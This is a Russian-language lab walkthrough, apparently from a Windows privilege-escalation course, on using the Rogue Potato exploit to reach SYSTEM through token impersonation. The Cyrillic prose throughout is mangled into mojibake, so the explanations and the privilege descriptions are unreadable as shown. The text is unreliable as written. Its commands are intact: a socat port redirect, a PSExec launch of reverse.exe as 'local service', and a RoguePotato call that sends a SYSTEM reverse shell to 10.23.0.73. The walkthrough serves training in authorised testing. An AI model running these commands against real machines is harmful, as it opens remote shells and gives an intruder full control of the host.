# üêæ 16. –ò–º–ø–µ—Ä—Å–æ–Ω–∞—Ü–∏—è —Ç–æ–∫–µ–Ω–æ–≤ - Rogue Potato

## üìú –û–ø–∏—Å–∞–Ω–∏–µ –∑–∞–¥–∞–Ω–∏—è
–í —ç—Ç–æ–º –∑–∞–¥–∞–Ω–∏–∏ –º—ã –±—É–¥–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç `Rogue Potato`, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Å–∏—Å—Ç–µ–º–µ —Å –ø—Ä–∞–≤–∞–º–∏ `SYSTEM` —á–µ—Ä–µ–∑ –∏–º–ø–µ—Ä—Å–æ–Ω–∞—Ü–∏—é —Ç–æ–∫–µ–Ω–æ–≤. –ú—ã –Ω–∞—Å—Ç—Ä–æ–∏–º –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ—Ä—Ç–∞ –Ω–∞ Kali, –∏—Å–ø–æ–ª—å–∑—É–µ–º `PSExec64.exe` –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ä–µ–≤–µ—Ä—Å–Ω–æ–≥–æ —à–µ–ª–ª–∞ —Å –ø—Ä–∞–≤–∞–º–∏ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ "local service", –∞ –∑–∞—Ç–µ–º –∑–∞–ø—É—Å—Ç–∏–º —ç–∫—Å–ø–ª–æ–π—Ç `Rogue Potato` –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–∞–≤ `SYSTEM`.

---

## üîç –®–∞–≥ 1: –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ—Ä—Ç–∞ —Å –ø–æ–º–æ—â—å—é socat
–ù–∞ Kali –Ω–∞—Å—Ç—Ä–æ–π—Ç–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ—Ä—Ç–∞ 135 –Ω–∞ –ø–æ—Ä—Ç 9999 –Ω–∞ Windows —Å –ø–æ–º–æ—â—å—é `socat`:

'`sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.1.124:9999`'

### üìã –û–∂–∏–¥–∞–µ–º—ã–π –≤—ã–≤–æ–¥
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ—Ä—Ç–∞ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–æ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ –∏ —Å–ª—É—à–∞—Ç–µ–ª—å –Ω–∞ Kali –≥–æ—Ç–æ–≤ –∫ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—é.

---

## üîë –®–∞–≥ 2: –°–∏–º—É–ª—è—Ü–∏—è –≤—Ö–æ–¥–∞ —Å –ø—Ä–∞–≤–∞–º–∏ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ "local service"
–ó–∞–ø—É—Å—Ç–∏—Ç–µ —Å–ª—É—à–∞—Ç–µ–ª—å –Ω–∞ Kali. –ó–∞—Ç–µ–º, –∏–º–∏—Ç–∏—Ä—É—è –≤—Ö–æ–¥ –≤ —Å–∏—Å—Ç–µ–º—É —Å —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å—å—é –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞, –æ—Ç–∫—Ä–æ–π—Ç–µ –∫–æ–º–∞–Ω–¥–Ω—É—é —Å—Ç—Ä–æ–∫—É —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ (–ü–ö–ú -> "–ó–∞–ø—É—Å–∫ –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞") –∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ `PSExec64.exe`, —á—Ç–æ–±—ã –∑–∞–ø—É—Å—Ç–∏—Ç—å `reverse.exe` —Å –ø—Ä–∞–≤–∞–º–∏ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ "local service":

'`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`'

### üìã –û–∂–∏–¥–∞–µ–º—ã–π –≤—ã–≤–æ–¥
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —Ä–µ–≤–µ—Ä—Å–Ω—ã–π —à–µ–ª–ª –∑–∞–ø—É—â–µ–Ω —Å –ø—Ä–∞–≤–∞–º–∏ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ "local service" –∏ –ø–æ–¥–∫–ª—é—á–µ–Ω –∫ —Å–ª—É—à–∞—Ç–µ–ª—é –Ω–∞ Kali.
![image](https://github.com/user-attachments/assets/c62a83cd-ed4a-4fe6-aa86-7ae8e24d4731)

---

## üìù –®–∞–≥ 3: –ó–∞–ø—É—Å–∫ —ç–∫—Å–ø–ª–æ–π—Ç–∞ RoguePotato
–¢–µ–ø–µ—Ä—å –≤ —Ä–µ–≤–µ—Ä—Å–Ω–æ–π –æ–±–æ–ª–æ—á–∫–µ "local service", –∑–∞–ø—É—Å—Ç–∏—Ç–µ —ç–∫—Å–ø–ª–æ–π—Ç `RoguePotato`, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –≤—Ç–æ—Ä–æ–π —Ä–µ–≤–µ—Ä—Å–Ω—ã–π —à–µ–ª–ª —Å –ø—Ä–∞–≤–∞–º–∏ `SYSTEM`:

'`C:\PrivEsc\RoguePotato.exe -r 10.23.0.73 -e "C:\PrivEsc\reverse.exe" -l 9999`'

### üìã –û–∂–∏–¥–∞–µ–º—ã–π –≤—ã–≤–æ–¥
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —ç–∫—Å–ø–ª–æ–π—Ç —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω –∏ –≤—ã –ø–æ–ª—É—á–∏–ª–∏ –≤—Ç–æ—Ä–æ–π —Ä–µ–≤–µ—Ä—Å–Ω—ã–π —à–µ–ª–ª —Å –ø—Ä–∞–≤–∞–º–∏ `SYSTEM` –Ω–∞ Kali.
![image](https://github.com/user-attachments/assets/79b2df6c-2308-418e-a66d-08b7ac0ec96e)

---

## üéâ –ü–æ–∑–¥—Ä–∞–≤–ª–µ–Ω–∏—è!
–í—ã —É—Å–ø–µ—à–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ —ç–∫—Å–ø–ª–æ–π—Ç `Rogue Potato` –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–∞–≤ `SYSTEM` —á–µ—Ä–µ–∑ –∏–º–ø–µ—Ä—Å–æ–Ω–∞—Ü–∏—é —Ç–æ–∫–µ–Ω–æ–≤! üéä

---

## üìå –ü—Ä–∏–º–µ—á–∞–Ω–∏—è
- –ë—É–¥—å—Ç–µ –æ—Å—Ç–æ—Ä–æ–∂–Ω—ã –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –ø–æ–ª—É—á–µ–Ω–Ω—ã—Ö –∑–Ω–∞–Ω–∏–π, –≤—Å–µ–≥–¥–∞ –¥–µ–π—Å—Ç–≤—É–π—Ç–µ –≤ —Ä–∞–º–∫–∞—Ö —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö —Ç–µ—Å—Ç–æ–≤ –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏–µ.

---

## üìå –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –æ—Ç–≤–µ—Ç–µ
### 1. **SeImpersonatePrivilege**:
–≠—Ç–∞ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é "–∏–º–ø–µ—Ä—Å–æ–Ω–∏—Ä–æ–≤–∞—Ç—å" (–≤—ã–¥–∞–≤–∞—Ç—å —Å–µ–±—è –∑–∞) –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –≠—Ç–æ –≤–∞–∂–Ω—ã–π —ç–ª–µ–º–µ–Ω—Ç –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ —Ç–æ–∫–µ–Ω–æ–≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –ö–æ–≥–¥–∞ —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –µ—Å—Ç—å —ç—Ç–∞ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è, –æ–Ω –º–æ–∂–µ—Ç –∑–∞—Ö–≤–∞—Ç—ã–≤–∞—Ç—å –∏–ª–∏ "–ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞—Ç—å" —á—É–∂–∏–µ —Ç–æ–∫–µ–Ω—ã (–Ω–∞–ø—Ä–∏–º–µ—Ä, —Ç–æ–∫–µ–Ω—ã –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏–ª–∏ —Å–µ—Ä–≤–∏—Å–Ω—ã—Ö —É—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π), —á—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π, —Ç–∞–∫–∏—Ö –∫–∞–∫ `RoguePotato`. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–º–∞–Ω–¥—ã —Å –ø—Ä–∞–≤–∞–º–∏ –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –Ω–∞–ø—Ä–∏–º–µ—Ä, —Å –ø—Ä–∞–≤–∞–º–∏ `LOCAL SERVICE`.

### 2. **SeAssignPrimaryTokenPrivilege**:
–≠—Ç–∞ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –Ω–∞–∑–Ω–∞—á–∞—Ç—å –ø–µ—Ä–≤–∏—á–Ω—ã–π —Ç–æ–∫–µ–Ω –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥—Ä—É–≥–∏–º –ø—Ä–æ—Ü–µ—Å—Å–∞–º. –ö–æ–≥–¥–∞ —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –µ—Å—Ç—å —ç—Ç–∞ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è, –æ–Ω –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω—è—Ç—å —Ç–æ–∫–µ–Ω—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, —á—Ç–æ –¥–∞–µ—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø–æ–≤—ã—Å–∏—Ç—å –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏. –í –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ `RoguePotato` —ç—Ç–∞ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞ –∫ –±–æ–ª–µ–µ –≤—ã—Å–æ–∫–æ–º—É —É—Ä–æ–≤–Ω—é –ø—Ä–∞–≤, —Ç–∞–∫–∏–º –∫–∞–∫ `SYSTEM`, –ø–æ–∑–≤–æ–ª—è—è –∑–∞–ø—É—Å–∫–∞—Ç—å –ø—Ä–æ—Ü–µ—Å—Å—ã –æ—Ç –∏–º–µ–Ω–∏ —ç—Ç–æ–π —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏.

### –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ `RoguePotato`:
- **SeImpersonatePrivilege** –ø–æ–∑–≤–æ–ª—è–µ—Ç –∞—Ç–∞–∫—É—é—â–µ–º—É "–ø–µ—Ä–µ—Ö–≤–∞—Ç–∏—Ç—å" —Ç–æ–∫–µ–Ω `LOCAL SERVICE` –∏ –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–º–∞–Ω–¥—ã –æ—Ç –∏–º–µ–Ω–∏ —ç—Ç–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞.
- **SeAssignPrimaryTokenPrivilege** –ø–æ–∑–≤–æ–ª—è–µ—Ç –∞—Ç–∞–∫—É—é—â–µ–º—É –Ω–∞–∑–Ω–∞—á–∏—Ç—å —Ç–æ–∫–µ–Ω –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Å –ø—Ä–∞–≤–∞–º–∏ `SYSTEM` –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–∞–ª—å–Ω–µ–π—à–∏—Ö –∞—Ç–∞–∫ —Å –≤—ã—Å—à–∏–º–∏ –ø—Ä–∞–≤–∞–º–∏.

–ò–º–µ–Ω–Ω–æ —Å–æ—á–µ—Ç–∞–Ω–∏–µ —ç—Ç–∏—Ö –¥–≤—É—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –∞—Ç–∞–∫—É—é—â–µ–º—É –≤—ã–ø–æ–ª–Ω–∏—Ç—å —ç–∫—Å–ø–ª–æ–π—Ç –∏ –ø–æ–ª—É—á–∏—Ç—å –ø—Ä–∞–≤–∞ `SYSTEM`.
